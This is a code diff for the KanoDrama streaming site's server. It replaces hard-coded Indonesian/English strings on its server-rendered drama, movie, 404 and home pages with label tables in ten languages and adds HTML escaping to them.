@@ -29,6 +29,7 @@ import {
   getJakartaDateKey,
   getMostWatchedVideosFromDb,
   getPayoutRuntimeConfig,
+  getSitemapCatalogVersion,
   getSiteVisitorStatsFromDb,
   getTopDailyStatsFromDb,
   getTrendingStatsMapFromDb,
@@ -109,6 +110,7 @@ import {
   extractLookSeriesBookId,
   getLookSeriesDetail,
   getLookSeriesEpisodes,
+  getLookSeriesFeed,
   getLookSeriesStream,
   type LookSeriesDetailPayload,
 } from './server/lookseriesService.ts';
@@ -1145,12 +1147,12 @@ function resolveOrigin(req: Request): string {
     ?.split(',')[0]
     ?.trim();
   const host = (forwardedHost || req.get('host') || `localhost:${PORT}`).split(':')[0];
-  if (/^(www\.)?(kano-drama\.live|kano-drama\.xyz|house-drama\.xyz|house-drama\.web\.id)$/i.test(host)) {
+  if (/^(www\.)?(kano-drama\.live|kano-drama\.xyz)$/i.test(host)) {
     return DEFAULT_SITE_ORIGIN;
   }
   const configured = getConfiguredSiteUrl();
   if (configured) {
-    if (/^https?:\/\/(www\.)?(kano-drama\.live|kano-drama\.xyz|house-drama\.xyz|house-drama\.web\.id)$/i.test(configured)) {
+    if (/^https?:\/\/(www\.)?(kano-drama\.live|kano-drama\.xyz)$/i.test(configured)) {
       return DEFAULT_SITE_ORIGIN;
     }
     const isLocalConfigured = /^https?:\/\/(localhost|127\.0\.0\.1|0\.0\.0\.0)(:\d+)?$/i.test(
@@ -2402,8 +2404,168 @@ function injectDramaSeoIntoHtml(
         }))
     : [];
 
+  const dramaSsrLabels: Record<
+    LanguageCode,
+    {
+      home: string;
+      related: string;
+      episodesUnit: string;
+      epDuration: string;
+      subs: string;
+      cast: string;
+      genres: string;
+      watchEp: string;
+      episodesTitle: string;
+      explore: string;
+      providers: string;
+      movies: string;
+    }
+  > = {
+    id: {
+      home: 'Beranda',
+      related: 'Rekomendasi Drama & Film Terkait',
+      episodesUnit: 'Episode',
+      epDuration: '~1-2 mnt/ep',
+      subs: 'Subtitle Indonesia & Multi-Bahasa',
+      cast: 'Pemeran',
+      genres: 'Genre',
+      watchEp: `Nonton Gratis Episode ${safeEp}`,
+      episodesTitle: 'Daftar Episode',
+      explore: 'Jelajahi Drama',
+      providers: 'Direktori Provider',
+      movies: 'Film HD',
+    },
+    en: {
+      home: 'Home',
+      related: 'Related Dramas & Movies',
+      episodesUnit: 'Episodes',
+      epDuration: '~1-2 min/ep',
+      subs: 'Indonesian & Multi-Language Subtitles',
+      cast: 'Cast',
+      genres: 'Genres',
+      watchEp: `Watch Free Episode ${safeEp}`,
+      episodesTitle: 'Episodes',
+      explore: 'Explore Dramas',
+      providers: 'All Providers',
+      movies: 'HD Movies',
+    },
+    cn: {
+      home: '首页',
+      related: '相关推荐短剧与电影',
+      episodesUnit: '集',
+      epDuration: '~1-2 分钟/集',
+      subs: '支持多语言字幕',
+      cast: '主演',
+      genres: '类型',
+      watchEp: `免费观看第 ${safeEp} 集`,
+      episodesTitle: '剧集列表',
+      explore: '探索短剧',
+      providers: '片源平台',
+      movies: '高清电影',
+    },
+    vi: {
+      home: 'Trang chủ',
+      related: 'Phim & Phim ngắn Liên quan',
+      episodesUnit: 'Tập',
+      epDuration: '~1-2 phút/tập',
+      subs: 'Phụ đề Đa ngôn ngữ',
+      cast: 'Diễn viên',
+      genres: 'Thể loại',
+      watchEp: `Xem Miễn Phí Tập ${safeEp}`,
+      episodesTitle: 'Danh sách Tập',
+      explore: 'Khám phá Phim',
+      providers: 'Tất cả Nguồn phim',
+      movies: 'Phim Lẻ HD',
+    },
+    es: {
+      home: 'Inicio',
+      related: 'Dramas y Películas Relacionadas',
+      episodesUnit: 'Episodios',
+      epDuration: '~1-2 min/ep',
+      subs: 'Subtítulos Multi-idioma',
+      cast: 'Reparto',
+      genres: 'Géneros',
+      watchEp: `Ver Gratis Episodio ${safeEp}`,
+      episodesTitle: 'Episodios',
+      explore: 'Explorar Dramas',
+      providers: 'Todas las Plataformas',
+      movies: 'Películas HD',
+    },
+    ko: {
+      home: '홈',
+      related: '관련 숏드라마 및 영화',
+      episodesUnit: '화',
+      epDuration: '~1-2분/화',
+      subs: '한국어 및 다국어 자막',
+      cast: '출연',
+      genres: '장르',
+      watchEp: `${safeEp}화 무료 시청`,
+      episodesTitle: '에피소드 목록',
+      explore: '드라마 탐색',
+      providers: '전체 플랫폼',
+      movies: 'HD 영화',
+    },
+    ja: {
+      home: 'ホーム',
+      related: '関連ショートドラマ＆映画',
+      episodesUnit: '話',
+      epDuration: '約1〜2分/話',
+      subs: '日本語・多言語字幕',
+      cast: '出演',
+      genres: 'ジャンル',
+      watchEp: `第${safeEp}話を無料視聴`,
+      episodesTitle: 'エピソード一覧',
+      explore: 'ドラマを探す',
+      providers: '配信元一覧',
+      movies: 'HD映画',
+    },
+    th: {
+      home: 'หน้าแรก',
+      related: 'ซีรีส์และภาพยนตร์ที่เกี่ยวข้อง',
+      episodesUnit: 'ตอน',
+      epDuration: '~1-2 นาที/ตอน',
+      subs: 'ซับไตเติ้ลหลายภาษา',
+      cast: 'นักแสดง',
+      genres: 'แนวเรื่อง',
+      watchEp: `ดูฟรี ตอนที่ ${safeEp}`,
+      episodesTitle: 'รายการตอน',
+      explore: 'สำรวจซีรีส์',
+      providers: 'แพลตฟอร์มทั้งหมด',
+      movies: 'หนัง HD',
+    },
+    ms: {
+      home: 'Utama',
+      related: 'Drama & Filem Berkaitan',
+      episodesUnit: 'Episod',
+      epDuration: '~1-2 min/ep',
+      subs: 'Sari Kata Berbilang Bahasa',
+      cast: 'Pelakon',
+      genres: 'Genre',
+      watchEp: `Tonton Percuma Episod ${safeEp}`,
+      episodesTitle: 'Senarai Episod',
+      explore: 'Teroka Drama',
+      providers: 'Semua Platform',
+      movies: 'Filem HD',
+    },
+    tl: {
+      home: 'Tahanan',
+      related: 'Kaugnay na Dramas at Pelikula',
+      episodesUnit: 'Episodes',
+      epDuration: '~1-2 min/ep',
+      subs: 'Multi-Language Subtitles',
+      cast: 'Mga Artista',
+      genres: 'Mga Genre',
+      watchEp: `Panoorin Nang Libre Episode ${safeEp}`,
+      episodesTitle: 'Mga Episode',
+      explore: 'Mag-explore ng Drama',
+      providers: 'Lahat ng Platform',
+      movies: 'HD Pelikula',
+    },
+  };
+  const dLabels = dramaSsrLabels[effectiveLang] || dramaSsrLabels.en;
+
   const dramaBreadcrumbs: Array<Record<string, unknown>> = [
-    { '@type': 'ListItem', position: 1, name: isId ? 'Beranda' : 'Home', item: `${brandOrigin}/` },
+    { '@type': 'ListItem', position: 1, name: dLabels.home, item: `${brandOrigin}/` },
     {
       '@type': 'ListItem',
       position: 2,
@@ -2518,7 +2680,7 @@ ${buildHreflangLinksHtml(canonicalUrl)}
     .join('');
   const ssrRelatedLinksHtml =
     relatedItems.length > 0
-      ? `<section aria-label="${isId ? 'Rekomendasi Drama & Film Terkait' : 'Related Dramas & Movies'}"><h2>${isId ? 'Rekomendasi Drama & Film Terkait' : 'Related Dramas & Movies'}</h2><ul>${relatedItems
+      ? `<section aria-label="${escapeHtmlAttr(dLabels.related)}"><h2>${escapeHtmlAttr(dLabels.related)}</h2><ul>${relatedItems
           .map((item) => {
             const rProvSlug = getProviderRouteSlug(item.provider);
             const rSlug = encodeURIComponent(item.slug);
@@ -2528,21 +2690,21 @@ ${buildHreflangLinksHtml(canonicalUrl)}
       : '';
 
   const ssrDramaRootHtml = `<main class="max-w-5xl mx-auto px-4 py-8 text-[#FAFAFA]">
-    <nav aria-label="Breadcrumb"><a href="${brandOrigin}/">${isId ? 'Beranda' : 'Home'}</a> / <a href="${brandOrigin}/provider/${provSlug}">${escapeHtmlAttr(drama.provider)}</a> / <span>${escapeHtmlAttr(drama.title)}</span></nav>
+    <nav aria-label="Breadcrumb"><a href="${brandOrigin}/">${escapeHtmlAttr(dLabels.home)}</a> / <a href="${brandOrigin}/provider/${provSlug}">${escapeHtmlAttr(drama.provider)}</a> / <span>${escapeHtmlAttr(drama.title)}</span></nav>
     <article itemscope itemtype="https://schema.org/TVSeries">
       <img itemprop="image" src="${escapeHtmlAttr(ogImageUrl)}" alt="${escapeHtmlAttr(drama.title)}" width="360" height="540" />
       <h1 itemprop="name">${escapeHtmlAttr(drama.title)}</h1>
-      <p><a href="${brandOrigin}/provider/${provSlug}">${escapeHtmlAttr(drama.provider)}</a> · ${epCount} ${isId ? 'Episode' : 'Episodes'} · ${isId ? '~1-2 mnt/ep' : '~1-2 min/ep'} · ${isId ? 'Subtitle Indonesia & Multi-Bahasa' : 'Indonesian & Multi-Language Subtitles'}</p>
-      ${drama.protagonist ? `<p>${isId ? 'Pemeran' : 'Cast'}: ${escapeHtmlAttr(drama.protagonist)}</p>` : ''}
-      ${ssrTagLinks ? `<p>${isId ? 'Genre' : 'Genres'}: ${ssrTagLinks}</p>` : ''}
+      <p><a href="${brandOrigin}/provider/${provSlug}">${escapeHtmlAttr(drama.provider)}</a> · ${epCount} ${escapeHtmlAttr(dLabels.episodesUnit)} · ${escapeHtmlAttr(dLabels.epDuration)} · ${escapeHtmlAttr(dLabels.subs)}</p>
+      ${drama.protagonist ? `<p>${escapeHtmlAttr(dLabels.cast)}: ${escapeHtmlAttr(drama.protagonist)}</p>` : ''}
+      ${ssrTagLinks ? `<p>${escapeHtmlAttr(dLabels.genres)}: ${ssrTagLinks}</p>` : ''}
       <p itemprop="description">${escapeHtmlAttr(seriesDescription)}</p>
-      <p><a href="${brandOrigin}${escapeHtmlAttr(watchPath)}">${isId ? `Nonton Gratis Episode ${safeEp}` : `Watch Free Episode ${safeEp}`}</a></p>
+      <p><a href="${brandOrigin}${escapeHtmlAttr(watchPath)}">${escapeHtmlAttr(dLabels.watchEp)}</a></p>
       <section aria-label="Episodes">
-        <h2>${isId ? 'Daftar Episode' : 'Episodes'} (${epCount})</h2>
+        <h2>${escapeHtmlAttr(dLabels.episodesTitle)} (${epCount})</h2>
         <ul>${ssrEpisodeLinks}</ul>
       </section>
       ${ssrRelatedLinksHtml}
-      <nav aria-label="Catalog Navigation"><a href="${brandOrigin}/explore">${isId ? 'Jelajahi Drama' : 'Explore Dramas'}</a> · <a href="${brandOrigin}/providers">${isId ? 'Direktori Provider' : 'All Providers'}</a> · <a href="${brandOrigin}/provider/${provSlug}">${escapeHtmlAttr(drama.provider)}</a> · <a href="${brandOrigin}/movies">${isId ? 'Film HD' : 'HD Movies'}</a></nav>
+      <nav aria-label="Catalog Navigation"><a href="${brandOrigin}/explore">${escapeHtmlAttr(dLabels.explore)}</a> · <a href="${brandOrigin}/providers">${escapeHtmlAttr(dLabels.providers)}</a> · <a href="${brandOrigin}/provider/${provSlug}">${escapeHtmlAttr(drama.provider)}</a> · <a href="${brandOrigin}/movies">${escapeHtmlAttr(dLabels.movies)}</a></nav>
     </article>
   </main>`;
 
@@ -2560,27 +2722,139 @@ function injectNotFoundSeoIntoHtml(
   kind: 'drama' | 'movie' | 'provider' = 'drama',
   ssrLang: LanguageCode = 'en'
 ): string {
-  const isIndonesian = ssrLang === 'id';
+  const notFoundCopy: Record<
+    LanguageCode,
+    {
+      movieHeading: string;
+      providerHeading: string;
+      dramaHeading: string;
+      providerMsg: string;
+      titleMsg: string;
+      home: string;
+      explore: string;
+      providers: string;
+      movies: string;
+    }
+  > = {
+    id: {
+      movieHeading: 'Film atau Serial Tidak Ditemukan',
+      providerHeading: 'Provider Tidak Ditemukan',
+      dramaHeading: 'Drama Tidak Ditemukan',
+      providerMsg: 'Maaf, halaman provider yang Anda cari tidak tersedia di katalog KanoDrama.',
+      titleMsg: 'Maaf, judul yang Anda cari tidak tersedia atau datanya kosong di katalog KanoDrama.',
+      home: 'Beranda',
+      explore: 'Jelajahi Drama',
+      providers: 'Daftar Provider',
+      movies: 'Daftar Film',
+    },
+    en: {
+      movieHeading: 'Movie or Series Not Found',
+      providerHeading: 'Provider Not Found',
+      dramaHeading: 'Drama Not Found',
+      providerMsg: 'Sorry, the requested provider page could not be found in the KanoDrama directory.',
+      titleMsg: 'Sorry, the requested title could not be found or is no longer available in the KanoDrama catalog.',
+      home: 'Home',
+      explore: 'Explore Dramas',
+      providers: 'All Providers',
+      movies: 'Browse Movies',
+    },
+    cn: {
+      movieHeading: '未找到电影或剧集',
+      providerHeading: '未找到片源平台',
+      dramaHeading: '未找到短剧',
+      providerMsg: '抱歉，KanoDrama 目录中未找到您请求的片源平台页面。',
+      titleMsg: '抱歉，您查找的作品在 KanoDrama 片库中不存在或已下线。',
+      home: '首页',
+      explore: '探索短剧',
+      providers: '片源平台',
+      movies: '高清电影',
+    },
+    vi: {
+      movieHeading: 'Không tìm thấy phim hoặc series',
+      providerHeading: 'Không tìm thấy nhà cung cấp',
+      dramaHeading: 'Không tìm thấy phim ngắn',
+      providerMsg: 'Rất tiếc, trang nhà cung cấp bạn yêu cầu không tồn tại trên KanoDrama.',
+      titleMsg: 'Rất tiếc, tác phẩm bạn tìm kiếm hiện không có trong danh mục KanoDrama.',
+      home: 'Trang chủ',
+      explore: 'Khám phá Phim',
+      providers: 'Tất cả Nguồn',
+      movies: 'Xem Phim Lẻ',
+    },
+    es: {
+      movieHeading: 'Película o Serie No Encontrada',
+      providerHeading: 'Plataforma No Encontrada',
+      dramaHeading: 'Drama No Encontrado',
+      providerMsg: 'Lo sentimos, la plataforma solicitada no se encontró en el directorio de KanoDrama.',
+      titleMsg: 'Lo sentimos, el título solicitado no está disponible en el catálogo de KanoDrama.',
+      home: 'Inicio',
+      explore: 'Explorar Dramas',
+      providers: 'Plataformas',
+      movies: 'Ver Películas',
+    },
+    ko: {
+      movieHeading: '영화 또는 시리즈를 찾을 수 없습니다',
+      providerHeading: '플랫폼을 찾을 수 없습니다',
+      dramaHeading: '드라마를 찾을 수 없습니다',
+      providerMsg: '요청하신 플랫폼 페이지를 KanoDrama 디렉터리에서 찾을 수 없습니다.',
+      titleMsg: '요청하신 작품을 KanoDrama 카탈로그에서 찾을 수 없습니다.',
+      home: '홈',
+      explore: '드라마 탐색',
+      providers: '전체 플랫폼',
+      movies: '영화 보기',
+    },
+    ja: {
+      movieHeading: '映画またはシリーズが見つかりません',
+      providerHeading: '配信元が見つかりません',
+      dramaHeading: 'ドラマが見つかりません',
+      providerMsg: 'お探しの配信元ページは KanoDrama ディレクトリに見つかりませんでした。',
+      titleMsg: 'お探しの作品は KanoDrama カタログに存在しないか終了しました。',
+      home: 'ホーム',
+      explore: 'ドラマを探す',
+      providers: '配信元一覧',
+      movies: '映画を見る',
+    },
+    th: {
+      movieHeading: 'ไม่พบภาพยนตร์หรือซีรีส์',
+      providerHeading: 'ไม่พบแพลตฟอร์ม',
+      dramaHeading: 'ไม่พบมินิซีรีส์',
+      providerMsg: 'ขออภัย ไม่พบหน้าแพลตฟอร์มที่คุณต้องการในระบบของ KanoDrama',
+      titleMsg: 'ขออภัย ไม่พบเรื่องที่คุณค้นหาหรือข้อมูลไม่พร้อมใช้งานบน KanoDrama',
+      home: 'หน้าแรก',
+      explore: 'สำรวจซีรีส์',
+      providers: 'แพลตฟอร์มทั้งหมด',
+      movies: 'ดูภาพยนตร์',
+    },
+    ms: {
+      movieHeading: 'Filem atau Siri Tidak Ditemui',
+      providerHeading: 'Platform Tidak Ditemui',
+      dramaHeading: 'Drama Tidak Ditemui',
+      providerMsg: 'Maaf, halaman platform yang diminta tidak ditemui dalam direktori KanoDrama.',
+      titleMsg: 'Maaf, tajuk yang diminta tidak ditemui dalam katalog KanoDrama.',
+      home: 'Utama',
+      explore: 'Teroka Drama',
+      providers: 'Semua Platform',
+      movies: 'Layari Filem',
+    },
+    tl: {
+      movieHeading: 'Hindi Nahanap ang Pelikula o Serye',
+      providerHeading: 'Hindi Nahanap ang Platform',
+      dramaHeading: 'Hindi Nahanap ang Drama',
+      providerMsg: 'Paumanhin, hindi nahanap ang hiniling na platform sa direktoryo ng KanoDrama.',
+      titleMsg: 'Paumanhin, hindi nahanap ang pamagat sa katalogo ng KanoDrama.',
+      home: 'Tahanan',
+      explore: 'Mag-explore',
+      providers: 'Lahat ng Platform',
+      movies: 'Mga Pelikula',
+    },
+  };
+  const nf = notFoundCopy[ssrLang] || notFoundCopy.en;
   const heading =
     kind === 'movie'
-      ? isIndonesian
-        ? 'Film atau Serial Tidak Ditemukan'
-        : 'Movie or Series Not Found'
+      ? nf.movieHeading
       : kind === 'provider'
-      ? isIndonesian
-        ? 'Provider Tidak Ditemukan'
-        : 'Provider Not Found'
-      : isIndonesian
-      ? 'Drama Tidak Ditemukan'
-      : 'Drama Not Found';
-  const message =
-    kind === 'provider'
-      ? isIndonesian
-        ? 'Maaf, halaman provider yang Anda cari tidak tersedia di katalog KanoDrama.'
-        : 'Sorry, the requested provider page could not be found in the KanoDrama directory.'
-      : isIndonesian
-      ? 'Maaf, judul yang Anda cari tidak tersedia atau datanya kosong di katalog KanoDrama.'
-      : 'Sorry, the requested title could not be found or is no longer available in the KanoDrama catalog.';
+      ? nf.providerHeading
+      : nf.dramaHeading;
+  const message = kind === 'provider' ? nf.providerMsg : nf.titleMsg;
   const pageTitle = `404 — ${heading} | KanoDrama`;
   const cleanPath = pathname.startsWith('/') ? pathname : `/${pathname}`;
 
@@ -2598,10 +2872,10 @@ function injectNotFoundSeoIntoHtml(
     <h1>404 — ${escapeHtmlAttr(heading)}</h1>
     <p>${escapeHtmlAttr(message)}</p>
     <nav aria-label="404 Navigation">
-      <a href="/">${isIndonesian ? 'Beranda' : 'Home'}</a> ·
-      <a href="/explore">${isIndonesian ? 'Jelajahi Drama' : 'Explore Dramas'}</a> ·
-      <a href="/providers">${isIndonesian ? 'Daftar Provider' : 'All Providers'}</a> ·
-      <a href="/movies">${isIndonesian ? 'Daftar Film' : 'Browse Movies'}</a>
+      <a href="/">${escapeHtmlAttr(nf.home)}</a> ·
+      <a href="/explore">${escapeHtmlAttr(nf.explore)}</a> ·
+      <a href="/providers">${escapeHtmlAttr(nf.providers)}</a> ·
+      <a href="/movies">${escapeHtmlAttr(nf.movies)}</a>
     </nav>
   </main>`;
 
@@ -2773,9 +3047,158 @@ function injectMovieSeoIntoHtml(
           potentialAction: { '@type': 'WatchAction', target: epWatchUrl },
         };
 
+  const movieSsrLabels: Record<
+    LanguageCode,
+    {
+      home: string;
+      movies: string;
+      related: string;
+      subs: string;
+      genres: string;
+      director: string;
+      cast: string;
+      watchNow: string;
+      allMovies: string;
+      explore: string;
+      providers: string;
+    }
+  > = {
+    id: {
+      home: 'Beranda',
+      movies: 'Film',
+      related: 'Rekomendasi Film & Drama Terkait',
+      subs: 'Subtitle Indonesia & Multi-Bahasa',
+      genres: 'Genre',
+      director: 'Sutradara',
+      cast: 'Pemeran',
+      watchNow: 'Nonton Gratis Sekarang',
+      allMovies: 'Semua Film HD',
+      explore: 'Jelajahi Drama',
+      providers: 'Direktori Provider',
+    },
+    en: {
+      home: 'Home',
+      movies: 'Movies',
+      related: 'Related Movies & Dramas',
+      subs: 'Indonesian & Multi-Language Subtitles',
+      genres: 'Genres',
+      director: 'Director',
+      cast: 'Cast',
+      watchNow: 'Watch Free Now',
+      allMovies: 'All HD Movies',
+      explore: 'Explore Dramas',
+      providers: 'All Providers',
+    },
+    cn: {
+      home: '首页',
+      movies: '电影',
+      related: '相关推荐电影与短剧',
+      subs: '支持多语言字幕',
+      genres: '类型',
+      director: '导演',
+      cast: '主演',
+      watchNow: '立即免费观看',
+      allMovies: '全部高清电影',
+      explore: '探索短剧',
+      providers: '片源平台',
+    },
+    vi: {
+      home: 'Trang chủ',
+      movies: 'Phim Lẻ',
+      related: 'Phim & Phim ngắn Liên quan',
+      subs: 'Phụ đề Đa ngôn ngữ',
+      genres: 'Thể loại',
+      director: 'Đạo diễn',
+      cast: 'Diễn viên',
+      watchNow: 'Xem Miễn Phí Ngay',
+      allMovies: 'Tất cả Phim HD',
+      explore: 'Khám phá Phim',
+      providers: 'Tất cả Nguồn phim',
+    },
+    es: {
+      home: 'Inicio',
+      movies: 'Películas',
+      related: 'Películas y Dramas Relacionados',
+      subs: 'Subtítulos Multi-idioma',
+      genres: 'Géneros',
+      director: 'Director',
+      cast: 'Reparto',
+      watchNow: 'Ver Gratis Ahora',
+      allMovies: 'Todas las Películas HD',
+      explore: 'Explorar Dramas',
+      providers: 'Todas las Plataformas',
+    },
+    ko: {
+      home: '홈',
+      movies: '영화',
+      related: '관련 영화 및 숏드라마',
+      subs: '한국어 및 다국어 자막',
+      genres: '장르',
+      director: '감독',
+      cast: '출연',
+      watchNow: '지금 무료 시청',
+      allMovies: '전체 HD 영화',
+      explore: '드라마 탐색',
+      providers: '전체 플랫폼',
+    },
+    ja: {
+      home: 'ホーム',
+      movies: '映画',
+      related: '関連映画＆ショートドラマ',
+      subs: '日本語・多言語字幕',
+      genres: 'ジャンル',
+      director: '監督',
+      cast: '出演',
+      watchNow: '今すぐ無料視聴',
+      allMovies: 'すべてのHD映画',
+      explore: 'ドラマを探す',
+      providers: '配信元一覧',
+    },
+    th: {
+      home: 'หน้าแรก',
+      movies: 'ภาพยนตร์',
+      related: 'ภาพยนตร์และซีรีส์ที่เกี่ยวข้อง',
+      subs: 'ซับไตเติ้ลหลายภาษา',
+      genres: 'แนวเรื่อง',
+      director: 'ผู้กำกับ',
+      cast: 'นักแสดง',
+      watchNow: 'ดูฟรีตอนนี้',
+      allMovies: 'หนัง HD ทั้งหมด',
+      explore: 'สำรวจซีรีส์',
+      providers: 'แพลตฟอร์มทั้งหมด',
+    },
+    ms: {
+      home: 'Utama',
+      movies: 'Filem',
+      related: 'Filem & Drama Berkaitan',
+      subs: 'Sari Kata Berbilang Bahasa',
+      genres: 'Genre',
+      director: 'Pengarah',
+      cast: 'Pelakon',
+      watchNow: 'Tonton Percuma Sekarang',
+      allMovies: 'Semua Filem HD',
+      explore: 'Teroka Drama',
+      providers: 'Semua Platform',
+    },
+    tl: {
+      home: 'Tahanan',
+      movies: 'Mga Pelikula',
+      related: 'Kaugnay na Pelikula at Drama',
+      subs: 'Multi-Language Subtitles',
+      genres: 'Mga Genre',
+      director: 'Direktor',
+      cast: 'Mga Artista',
+      watchNow: 'Panoorin Nang Libre Ngayon',
+      allMovies: 'Lahat ng HD Pelikula',
+      explore: 'Mag-explore ng Drama',
+      providers: 'Lahat ng Platform',
+    },
+  };
+  const mLabels = movieSsrLabels[effectiveLang] || movieSsrLabels.en;
+
   const movieBreadcrumbs: Array<Record<string, unknown>> = [
-    { '@type': 'ListItem', position: 1, name: isId ? 'Beranda' : 'Home', item: `${brandOrigin}/` },
-    { '@type': 'ListItem', position: 2, name: isId ? 'Film' : 'Movies', item: `${brandOrigin}/movies` },
+    { '@type': 'ListItem', position: 1, name: mLabels.home, item: `${brandOrigin}/` },
+    { '@type': 'ListItem', position: 2, name: mLabels.movies, item: `${brandOrigin}/movies` },
     { '@type': 'ListItem', position: 3, name: movie.title, item: canonicalUrl },
   ];
   if (isSeries && (isWatchRoute || safeEp > 1)) {
@@ -2862,7 +3285,7 @@ ${buildHreflangLinksHtml(canonicalUrl)}
     .join(' · ');
   const ssrRelatedMovieHtml =
     relatedItems.length > 0
-      ? `<section aria-label="${isId ? 'Rekomendasi Film & Drama Terkait' : 'Related Movies & Dramas'}"><h2>${isId ? 'Rekomendasi Film & Drama Terkait' : 'Related Movies & Dramas'}</h2><ul>${relatedItems
+      ? `<section aria-label="${escapeHtmlAttr(mLabels.related)}"><h2>${escapeHtmlAttr(mLabels.related)}</h2><ul>${relatedItems
           .map(
             (item) =>
               `<li><a href="${brandOrigin}/${getProviderRouteSlug(item.provider)}/detail/${encodeURIComponent(item.slug)}">${escapeHtmlAttr(item.title)}</a></li>`
@@ -2870,19 +3293,19 @@ ${buildHreflangLinksHtml(canonicalUrl)}
           .join('')}</ul></section>`
       : '';
   const ssrMovieRootHtml = `<main class="max-w-5xl mx-auto px-4 py-8 text-[#FAFAFA]">
-    <nav aria-label="Breadcrumb"><a href="${brandOrigin}/">${isId ? 'Beranda' : 'Home'}</a> / <a href="${brandOrigin}/movies">${isId ? 'Film' : 'Movies'}</a> / <span>${escapeHtmlAttr(displayMovieTitle)}</span></nav>
+    <nav aria-label="Breadcrumb"><a href="${brandOrigin}/">${escapeHtmlAttr(mLabels.home)}</a> / <a href="${brandOrigin}/movies">${escapeHtmlAttr(mLabels.movies)}</a> / <span>${escapeHtmlAttr(displayMovieTitle)}</span></nav>
     <article itemscope itemtype="${isSeries ? 'https://schema.org/TVSeries' : 'https://schema.org/Movie'}">
       <img itemprop="image" src="${escapeHtmlAttr(ogImageUrl)}" alt="${escapeHtmlAttr(displayMovieTitle)}" width="360" height="540" />
       <h1 itemprop="name">${escapeHtmlAttr(displayMovieTitle)}</h1>
-      <p>${[movieProviderLabel, movie.quality || 'HD', 'duration' in movie && typeof movie.duration === 'string' ? movie.duration : '', movie.year, movie.area, isId ? 'Subtitle Indonesia & Multi-Bahasa' : 'Indonesian & Multi-Language Subtitles'].filter((v): v is string => Boolean(v)).map((v) => escapeHtmlAttr(v)).join(' · ')}</p>
-      ${movieGenreLinks ? `<p>${isId ? 'Genre' : 'Genres'}: ${movieGenreLinks}</p>` : ''}
-      ${movie.director ? `<p>${isId ? 'Sutradara' : 'Director'}: ${escapeHtmlAttr(movie.director)}</p>` : ''}
-      ${movie.actors?.length ? `<p>${isId ? 'Pemeran' : 'Cast'}: ${escapeHtmlAttr(movie.actors.slice(0, 8).join(', '))}</p>` : ''}
+      <p>${[movieProviderLabel, movie.quality || 'HD', 'duration' in movie && typeof movie.duration === 'string' ? movie.duration : '', movie.year, movie.area, mLabels.subs].filter((v): v is string => Boolean(v)).map((v) => escapeHtmlAttr(v)).join(' · ')}</p>
+      ${movieGenreLinks ? `<p>${escapeHtmlAttr(mLabels.genres)}: ${movieGenreLinks}</p>` : ''}
+      ${movie.director ? `<p>${escapeHtmlAttr(mLabels.director)}: ${escapeHtmlAttr(movie.director)}</p>` : ''}
+      ${movie.actors?.length ? `<p>${escapeHtmlAttr(mLabels.cast)}: ${escapeHtmlAttr(movie.actors.slice(0, 8).join(', '))}</p>` : ''}
       <p itemprop="description">${escapeHtmlAttr(seriesDescription)}</p>
-      <p><a href="${brandOrigin}${escapeHtmlAttr(watchPath)}">${isId ? 'Nonton Gratis Sekarang' : 'Watch Free Now'}</a></p>
+      <p><a href="${brandOrigin}${escapeHtmlAttr(watchPath)}">${escapeHtmlAttr(mLabels.watchNow)}</a></p>
       ${movieEpLinks}
       ${ssrRelatedMovieHtml}
-      <nav aria-label="Catalog Navigation"><a href="${brandOrigin}/movies">${isId ? 'Semua Film HD' : 'All HD Movies'}</a> · <a href="${brandOrigin}/explore">${isId ? 'Jelajahi Drama' : 'Explore Dramas'}</a> · <a href="${brandOrigin}/providers">${isId ? 'Direktori Provider' : 'All Providers'}</a></nav>
+      <nav aria-label="Catalog Navigation"><a href="${brandOrigin}/movies">${escapeHtmlAttr(mLabels.allMovies)}</a> · <a href="${brandOrigin}/explore">${escapeHtmlAttr(mLabels.explore)}</a> · <a href="${brandOrigin}/providers">${escapeHtmlAttr(mLabels.providers)}</a></nav>
     </article>
   </main>`;
 
@@ -3028,7 +3451,154 @@ function buildSsrHomeRootHtml(
   featured?: HomeSsrFeaturedData
 ): string {
   const brandOrigin = DEFAULT_SITE_ORIGIN;
-  const isId = ssrLang === 'id';
+  const homeCopyMap: Record<
+    LanguageCode,
+    {
+      h1: string;
+      home: string;
+      explore: string;
+      movies: string;
+      providers: string;
+      trending: string;
+      latest: string;
+      vip: string;
+      popularProviders: string;
+      curatedGenres: string;
+      popularTitle: string;
+    }
+  > = {
+    id: {
+      h1: 'KanoDrama — Nonton Drama Pendek, Serial Asia &amp; Film Sub Indo Gratis Tanpa Iklan',
+      home: 'Beranda KanoDrama',
+      explore: 'Jelajahi Semua Drama',
+      movies: 'Film &amp; Serial HD',
+      providers: 'Direktori Provider',
+      trending: 'Drama Trending',
+      latest: 'Rilis Terbaru',
+      vip: 'Koleksi VIP',
+      popularProviders: 'Platform &amp; Provider Populer',
+      curatedGenres: 'Genre &amp; Koleksi Pilihan',
+      popularTitle: 'Drama Pendek &amp; Film Populer di KanoDrama',
+    },
+    en: {
+      h1: 'KanoDrama — Watch Short Dramas, Asian Series &amp; HD Movies Ad-Free',
+      home: 'KanoDrama Home',
+      explore: 'Explore All Dramas',
+      movies: 'HD Movies &amp; Cinema',
+      providers: 'Providers Directory',
+      trending: 'Trending Short Dramas',
+      latest: 'Latest Releases',
+      vip: 'VIP Selection',
+      popularProviders: 'Popular Drama Providers',
+      curatedGenres: 'Curated Genres &amp; Collections',
+      popularTitle: 'Popular Short Dramas &amp; Movies on KanoDrama',
+    },
+    cn: {
+      h1: 'KanoDrama — 免费无广告高清观看热门竖屏短剧、亚洲剧集与院线电影',
+      home: 'KanoDrama 首页',
+      explore: '探索全部短剧',
+      movies: '高清电影与剧集',
+      providers: '片源平台大全',
+      trending: '今日热播榜单',
+      latest: '最新上线',
+      vip: 'VIP 尊享专区',
+      popularProviders: '热门短剧片源平台',
+      curatedGenres: '精选题材与合集',
+      popularTitle: 'KanoDrama 热门短剧与电影推荐',
+    },
+    vi: {
+      h1: 'KanoDrama — Xem Phim Ngắn Dọc, Phim Bộ Châu Á &amp; Phim Lẻ HD Miễn Phí',
+      home: 'Trang chủ KanoDrama',
+      explore: 'Khám phá Tất cả Phim',
+      movies: 'Phim Chiếu Rạp HD',
+      providers: 'Danh bạ Nguồn phim',
+      trending: 'Phim Ngắn Thịnh Hành',
+      latest: 'Mới Phát Hành',
+      vip: 'Tuyển chọn VIP',
+      popularProviders: 'Nền tảng Phim Ngắn Phổ biến',
+      curatedGenres: 'Thể loại &amp; Bộ sưu tập Chọn lọc',
